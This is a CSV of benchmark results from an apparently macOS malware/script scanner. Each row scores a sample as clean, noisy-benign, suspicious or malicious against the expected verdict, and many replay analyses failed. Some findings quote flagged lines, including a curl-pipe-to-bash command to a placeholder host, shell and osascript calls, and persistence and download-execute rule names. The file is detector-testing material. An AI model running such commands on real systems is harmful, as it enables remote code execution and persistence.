run_id,sample_id,group,subtype,path,detected_type,score,verdict,expected_verdict,expected_score_min,expected_score_max,matched_verdict,matched_score_range,mismatch_reason,status,analysis_duration_ms,timestamp,has_findings,error,analysis_summary,findings
"2026-03-08T10-11-22Z-441932","clean_python_text_summary_01","clean","python","clean/python/clean_python_text_summary_01.py","pythonScript","10","clean","clean","0","8","true","false","score_too_high","completed","183","2026-03-08T10:11:26.265Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","clean_shell_backup_01","clean","shell","clean/shell/clean_shell_backup_01.sh","shellScript","10","clean","clean","0","15","true","true","","completed","180","2026-03-08T10:11:26.445Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","clean_shell_backup_02","clean","shell","clean/shell/clean_shell_backup_02.sh","shellScript","10","clean","clean","0","12","true","true","","completed","182","2026-03-08T10:11:26.627Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","clean_shell_log_archive_01","clean","shell","clean/shell/clean_shell_log_archive_01.sh","shellScript","10","clean","clean","0","12","true","true","","completed","179","2026-03-08T10:11:26.807Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","clean_shell_open_safe_site_01","clean","shell","clean/shell/clean_shell_open_safe_site_01.sh","shellScript","10","clean","clean","0","8","true","false","score_too_high","completed","180","2026-03-08T10:11:26.987Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","clean_shell_write_test_plist_01","clean","shell","clean/shell/clean_shell_write_test_plist_01.sh","shellScript","10","clean","clean","0","14","true","true","","completed","183","2026-03-08T10:11:27.171Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","noisy_app_bundle_fixture_01","noisy_benign","app","noisy_benign/app/NoisyUtilityFixture_01.app","appBundle","10","clean","benign_noisy","12","30","true","false","score_too_low","completed","1615","2026-03-08T10:11:28.787Z","true","","该样本样本可执行但未签名，来源可信度不足。。综合评分 10/100，判定 Clean（低风险）。","未获取到 Entitlements，权限边界不可完全判断 | 无法完整读取签名信息：/Users/wudazi/Beforeinstall/benchmark/noisy_benign/app/NoisyUtilityFixture_01.app: code object is not signed at all | 未提取到 Entitlements（可能该应用未声明或无法读取） | generic_partial: 无法完整读取签名信息：/Users/wudazi/Beforeinstall/benchmark/noisy_benign/app/NoisyUtilityFixture_01.app: code object is not signed at all | generic_partial: 未提取到 Entitlements（可能该应用未声明或无法读取）"
"2026-03-08T10-11-22Z-441932","noisy_app_updater_manifest_01","noisy_benign","app","noisy_benign/app/noisy_app_updater_manifest_01.json","unknown","0","clean","benign_noisy","18","38","true","false","score_too_low","completed","438","2026-03-08T10:11:29.225Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","No dedicated analyzer for unknown. Fallback to generic analyzer. | generic_partial: No dedicated analyzer for unknown. Fallback to generic analyzer."
"2026-03-08T10-11-22Z-441932","noisy_applescript_admin_prompt_sim_01","noisy_benign","applescript","noisy_benign/applescript/noisy_applescript_admin_prompt_sim_01.applescript","appleScript","0","clean","benign_noisy","18","40","true","false","score_too_low","completed","176","2026-03-08T10:11:29.401Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","noisy_applescript_finder_batch_rename_01","noisy_benign","applescript","noisy_benign/applescript/noisy_applescript_finder_batch_rename_01.applescript","appleScript","0","clean","benign_noisy","10","28","true","false","score_too_low","completed","177","2026-03-08T10:11:29.578Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","检测到脚本高风险行为特征 | [applescript.finder_control] 控制 Finder 行为 [low] L3-3 Δ8: tell application ""Finder"""
"2026-03-08T10-11-22Z-441932","noisy_applescript_terminal_echo_pwd_01","noisy_benign","applescript","noisy_benign/applescript/noisy_applescript_terminal_echo_pwd_01.applescript","appleScript","0","clean","benign_noisy","12","30","true","false","score_too_low","completed","176","2026-03-08T10:11:29.754Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","检测到脚本高风险行为特征 | [applescript.terminal_control] 控制 Terminal 应用 [medium] L1-1 Δ12: tell application ""Terminal"""
"2026-03-08T10-11-22Z-441932","noisy_js_child_process_ls_01","noisy_benign","js","noisy_benign/js/noisy_js_child_process_ls_01.js","javaScript","10","clean","benign_noisy","12","30","true","false","score_too_low","completed","190","2026-03-08T10:11:29.945Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","检测到脚本高风险行为特征 | [javascript.child_process] Node child_process 执行链 [high] L2-2 Δ22: const { execFile } = require('child_process'); | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-08T10-11-22Z-441932","noisy_js_eval_math_only_01","noisy_benign","js","noisy_benign/js/noisy_js_eval_math_only_01.js","javaScript","25","clean","benign_noisy","15","35","true","true","","completed","179","2026-03-08T10:11:30.124Z","true","","该样本检测到编码/混淆后执行行为，存在规避审计迹象。；未获取到可执行样本签名信息。。综合评分 25/100，判定 Clean（低风险）。","检测到混淆或编码逃逸 | [javascript.eval] JavaScript 动态执行(eval) [high] L3-3 Δ22: const result = eval(expression); | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-08T10-11-22Z-441932","noisy_js_network_cache_text_01","noisy_benign","js","noisy_benign/js/noisy_js_network_cache_text_01.js","javaScript","45","suspicious","benign_noisy","14","32","false","false","verdict_too_high","completed","182","2026-03-08T10:11:30.306Z","true","","该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。；未获取到可执行样本签名信息。。综合评分 45/100，判定 Suspicious（可疑）。","检测到远程下载执行链 | 检测到混淆或编码逃逸 | [javascript.network_download_exec] 网络下载并执行链 [critical] L10-10 Δ34: https.get('https://example.com/', (res) => { | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-08T10-11-22Z-441932","noisy_js_postinstall_sim_01","noisy_benign","js","noisy_benign/js/noisy_js_postinstall_sim_01.js","javaScript","10","clean","benign_noisy","20","42","true","false","score_too_low","completed","177","2026-03-08T10:11:30.484Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","noisy_pkg_fixture_02","noisy_benign","pkg","noisy_benign/pkg/noisy_pkg_fixture_02","machO","10","clean","benign_noisy","15","35","true","false","score_too_low","completed","771","2026-03-08T10:11:31.255Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","Executable file | No dedicated analyzer for machO. Fallback to generic analyzer. | generic_partial: No dedicated analyzer for machO. Fallback to generic analyzer."
"2026-03-08T10-11-22Z-441932","noisy_pkg_preinstall_sim_01","noisy_benign","pkg","noisy_benign/pkg/noisy_pkg_preinstall_sim_01.sh","shellScript","10","clean","benign_noisy","22","48","true","false","score_too_low","completed","180","2026-03-08T10:11:31.436Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","noisy_python_build_subprocess_01","noisy_benign","python","noisy_benign/python/noisy_python_build_subprocess_01.py","pythonScript","10","clean","benign_noisy","12","28","true","false","score_too_low","completed","178","2026-03-08T10:11:31.614Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","检测到混淆或编码逃逸 | [python.subprocess_exec] subprocess 外部进程执行 [high] L11-11 Δ20: result = subprocess.run(step, check=True, capture_output=True, text=True) | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-08T10-11-22Z-441932","noisy_python_dynamic_loader_sim_01","noisy_benign","python","noisy_benign/python/noisy_python_dynamic_loader_sim_01.py","pythonScript","10","clean","benign_noisy","16","35","true","false","score_too_low","completed","182","2026-03-08T10:11:31.797Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","noisy_python_remote_text_api_01","noisy_benign","python","noisy_benign/python/noisy_python_remote_text_api_01.py","pythonScript","10","clean","benign_noisy","14","32","true","false","score_too_low","completed","177","2026-03-08T10:11:31.974Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","noisy_python_tempfile_cleanup_01","noisy_benign","python","noisy_benign/python/noisy_python_tempfile_cleanup_01.py","pythonScript","10","clean","benign_noisy","10","24","true","true","","completed","179","2026-03-08T10:11:32.154Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","noisy_python_updater_01","noisy_benign","python","noisy_benign/python/noisy_python_updater_01.py","pythonScript","10","clean","benign_noisy","20","45","true","false","score_too_low","completed","177","2026-03-08T10:11:32.332Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","noisy_shell_appsupport_style_write_01","noisy_benign","shell","noisy_benign/shell/noisy_shell_appsupport_style_write_01.sh","shellScript","10","clean","benign_noisy","10","24","true","true","","completed","180","2026-03-08T10:11:32.512Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","noisy_shell_base64_config_01","noisy_benign","shell","noisy_benign/shell/noisy_shell_base64_config_01.sh","shellScript","10","clean","benign_noisy","12","30","true","false","score_too_low","completed","182","2026-03-08T10:11:32.694Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","noisy_shell_chmod_tool_01","noisy_benign","shell","noisy_benign/shell/noisy_shell_chmod_tool_01.sh","shellScript","10","clean","benign_noisy","10","26","true","true","","completed","183","2026-03-08T10:11:32.877Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","noisy_shell_installer_like_01","noisy_benign","shell","noisy_benign/shell/noisy_shell_installer_like_01.sh","shellScript","45","suspicious","benign_noisy","20","45","false","true","verdict_too_high","completed","179","2026-03-08T10:11:33.056Z","true","","该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。；未获取到可执行样本签名信息。。综合评分 45/100，判定 Suspicious（可疑）。","检测到远程下载执行链 | [shell.curl_pipe_sh] curl 下载后直接管道执行 [critical] L8-8 Δ35: DANGEROUS_LOOKING_CMD='curl -fsSL https://example.invalid/installer.sh | bash' | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-08T10-11-22Z-441932","noisy_shell_update_checker_02","noisy_benign","shell","noisy_benign/shell/noisy_shell_update_checker_02.sh","shellScript","10","clean","benign_noisy","12","30","true","false","score_too_low","completed","183","2026-03-08T10:11:33.240Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","replay_clean_app_lifecycle_02","replay_clean","jsonReplay","replay/clean/replay_clean_app_lifecycle_02.json","jsonReplay","0","unknown","","","","","","analysis_failed","failed","1","2026-03-08T10:11:33.241Z","false","The data couldn’t be read because it is missing.","",""
"2026-03-08T10-11-22Z-441932","replay_clean_backup_flow_01","replay_clean","replay_json","replay/clean/replay_clean_backup_flow_01.json","jsonReplay","0","unknown","clean","0","15","false","true","verdict_too_low","completed","0","2026-03-08T10:11:33.242Z","false","","Replay evaluation: unknown (score 0)",""
"2026-03-08T10-11-22Z-441932","replay_clean_js_fetch_cache_02","replay_clean","jsonReplay","replay/clean/replay_clean_js_fetch_cache_02.json","jsonReplay","0","unknown","","","","","","analysis_failed","failed","0","2026-03-08T10:11:33.242Z","false","The data couldn’t be read because it is missing.","",""
"2026-03-08T10-11-22Z-441932","replay_clean_pkg_appsupport_install_02","replay_clean","jsonReplay","replay/clean/replay_clean_pkg_appsupport_install_02.json","jsonReplay","0","unknown","","","","","","analysis_failed","failed","0","2026-03-08T10:11:33.242Z","false","The data couldn’t be read because it is missing.","",""
"2026-03-08T10-11-22Z-441932","replay_clean_python_scan_report_02","replay_clean","jsonReplay","replay/clean/replay_clean_python_scan_report_02.json","jsonReplay","0","unknown","","","","","","analysis_failed","failed","0","2026-03-08T10:11:33.243Z","false","The data couldn’t be read because it is missing.","",""
"2026-03-08T10-11-22Z-441932","replay_malicious_app_bash_curl_persist_02","replay_malicious","jsonReplay","replay/malicious/replay_malicious_app_bash_curl_persist_02.json","jsonReplay","0","unknown","","","","","","analysis_failed","failed","0","2026-03-08T10:11:33.243Z","false","The data couldn’t be read because it is missing.","",""
"2026-03-08T10-11-22Z-441932","replay_malicious_app_osascript_chain_02","replay_malicious","jsonReplay","replay/malicious/replay_malicious_app_osascript_chain_02.json","jsonReplay","0","unknown","","","","","","analysis_failed","failed","0","2026-03-08T10:11:33.244Z","false","The data couldn’t be read because it is missing.","",""
"2026-03-08T10-11-22Z-441932","replay_malicious_chain_01","replay_malicious","replay_json","replay/malicious/replay_malicious_chain_01.json","jsonReplay","100","malicious","malicious","85","100","true","true","","completed","0","2026-03-08T10:11:33.244Z","true","","Replay evaluation: malicious (score 100)","[script.download_execute_chain] 可疑脚本下载执行链 (+35) | [persistence.launch_agent_write] 写入 LaunchAgent / LaunchDaemon (+30) | [process.spawn_shell] 样本拉起 Shell 子进程 (+15) | [network.remote_connect] 运行期远程网络连接 (+10) | [filesystem.sensitive_path_change] 修改敏感路径 (+20)"
"2026-03-08T10-11-22Z-441932","replay_malicious_pkg_postinstall_multiegres_02","replay_malicious","jsonReplay","replay/malicious/replay_malicious_pkg_postinstall_multiegres_02.json","jsonReplay","0","unknown","","","","","","analysis_failed","failed","0","2026-03-08T10:11:33.245Z","false","The data couldn’t be read because it is missing.","",""
"2026-03-08T10-11-22Z-441932","replay_malicious_python_subprocess_priv_02","replay_malicious","jsonReplay","replay/malicious/replay_malicious_python_subprocess_priv_02.json","jsonReplay","0","unknown","","","","","","analysis_failed","failed","0","2026-03-08T10:11:33.245Z","false","The data couldn’t be read because it is missing.","",""
"2026-03-08T10-11-22Z-441932","replay_suspicious_app_shell_egress_02","replay_suspicious","jsonReplay","replay/suspicious/replay_suspicious_app_shell_egress_02.json","jsonReplay","0","unknown","","","","","","analysis_failed","failed","0","2026-03-08T10:11:33.245Z","false","The data couldn’t be read because it is missing.","",""
"2026-03-08T10-11-22Z-441932","replay_suspicious_persistence_attempt_01","replay_suspicious","replay_json","replay/suspicious/replay_suspicious_persistence_attempt_01.json","jsonReplay","50","suspicious","suspicious","60","80","true","false","score_too_low","completed","0","2026-03-08T10:11:33.246Z","true","","Replay evaluation: suspicious (score 50)","[persistence.launch_agent_write] 写入 LaunchAgent / LaunchDaemon (+30) | [filesystem.sensitive_path_change] 修改敏感路径 (+20)"
"2026-03-08T10-11-22Z-441932","replay_suspicious_pkg_persistence_mirror_02","replay_suspicious","jsonReplay","replay/suspicious/replay_suspicious_pkg_persistence_mirror_02.json","jsonReplay","0","unknown","","","","","","analysis_failed","failed","0","2026-03-08T10:11:33.246Z","false","The data couldn’t be read because it is missing.","",""
"2026-03-08T10-11-22Z-441932","replay_suspicious_python_decode_plist_mirror_02","replay_suspicious","jsonReplay","replay/suspicious/replay_suspicious_python_decode_plist_mirror_02.json","jsonReplay","0","unknown","","","","","","analysis_failed","failed","0","2026-03-08T10:11:33.246Z","false","The data couldn’t be read because it is missing.","",""
"2026-03-08T10-11-22Z-441932","replay_suspicious_shell_fanout_tmp_egress_02","replay_suspicious","jsonReplay","replay/suspicious/replay_suspicious_shell_fanout_tmp_egress_02.json","jsonReplay","0","unknown","","","","","","analysis_failed","failed","0","2026-03-08T10:11:33.246Z","false","The data couldn’t be read because it is missing.","",""
"2026-03-08T10-11-22Z-441932","suspicious_applescript_auth_lure_prompt_02","suspicious","applescript","suspicious/applescript/suspicious_applescript_auth_lure_prompt_02.applescript","appleScript","0","clean","suspicious","35","52","false","false","verdict_too_low","completed","182","2026-03-08T10:11:33.429Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","suspicious_applescript_doshell_echo_02","suspicious","applescript","suspicious/applescript/suspicious_applescript_doshell_echo_02.applescript","appleScript","0","clean","suspicious","55","72","false","false","verdict_too_low","completed","176","2026-03-08T10:11:33.606Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","检测到脚本高风险行为特征 | [applescript.do_shell_script] AppleScript 调用 shell [high] L2-2 Δ20: do shell script ""echo '[dry-run] would run: "" & suspiciousCmd & ""'"" | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-08T10-11-22Z-441932","suspicious_applescript_keystroke_sim_01","suspicious","applescript","suspicious/applescript/suspicious_applescript_keystroke_sim_01.applescript","appleScript","0","clean","suspicious","58","78","false","false","verdict_too_low","completed","176","2026-03-08T10:11:33.782Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","suspicious_applescript_system_settings_text_02","suspicious","applescript","suspicious/applescript/suspicious_applescript_system_settings_text_02.applescript","appleScript","0","clean","suspicious","35","50","false","false","verdict_too_low","completed","176","2026-03-08T10:11:33.959Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-11-22Z-441932","suspicious_applescript_terminal_download_print_02","suspicious","applescript","suspicious/applescript/suspicious_applescript_terminal_download_print_02.applescript","appleScript","0","clean","suspicious","52","70","false","false","verdict_too_low","completed","178","2026-03-08T10:11:34.137Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","检测到脚本高风险行为特征 | [applescript.terminal_control] 控制 Terminal 应用 [medium] L1-1 Δ12: tell application ""Terminal"""
"2026-03-08T10-11-22Z-441932","suspicious_hybrid_app_bundle_fixture_02","suspicious","hybrid_app","suspicious/hybrid/SyntheticSuspiciousFixture_02.app","appBundle","10","clean","suspicious","60","78","false","false","verdict_too_low","completed","2236","2026-03-08T10:11:36.374Z","true","","该样本样本可执行但未签名，来源可信度不足。。综合评分 10/100，判定 Clean（低风险）。","未获取到 Entitlements，权限边界不可完全判断 | 无法完整读取签名信息：/Users/wudazi/Beforeinstall/benchmark/suspicious/hybrid/SyntheticSuspiciousFixture_02.app: code object is not signed at all | 未提取到 Entitlements（可能该应用未声明或无法读取） | generic_partial: 无法完整读取签名信息：/Users/wudazi/Beforeinstall/benchmark/suspicious/hybrid/SyntheticSuspiciousFixture_02.app: code object is not signed at all | generic_partial: 未提取到 Entitlements（可能该应用未声明或无法读取）"
"2026-03-08T10-11-22Z-441932","suspicious_hybrid_chain_sim_01","suspicious","hybrid","suspicious/hybrid/suspicious_hybrid_chain_sim_01.json","appleScript","0","clean","suspicious","65","88","false","false","verdict_too_low","completed","181","2026-03-08T10:11:36.555Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","检测到脚本高风险行为特征 | [applescript.do_shell_script] AppleScript 调用 shell [high] L18-18 Δ20: ""payload"": ""do shell script 'osascript -e ...'"" | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-08T10-11-22Z-441932","suspicious_hybrid_dmg_mirror_fixture_02","suspicious","hybrid_dmg","suspicious/hybrid/suspicious_hybrid_dmg_mirror_fixture_02","machO","10","clean","malicious","70","80","false","false","verdict_too_low","completed","781","2026-03-08T10:11:37.336Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","Executable file | No dedicated analyzer for machO. Fallback to generic analyzer. | generic_partial: No dedicated analyzer for machO. Fallback to generic analyzer."
"2026-03-08T10-11-22Z-441932","suspicious_hybrid_pkg_fixture_02","suspicious","hybrid_pkg","suspicious/hybrid/suspicious_hybrid_pkg_fixture_02","machO","10","clean","malicious","68","80","false","false","verdict_too_low","completed","764","2026-03-08T10:11:38.101Z","true","","该样本未获取到可执行样本签名信息。。综合评分 10/100，判定 Clean（低风险）。","Executable file | No dedicated analyzer for machO. Fallback to generic analyzer. | generic_partial: No dedicated analyzer for machO. Fallback to generic analyzer."
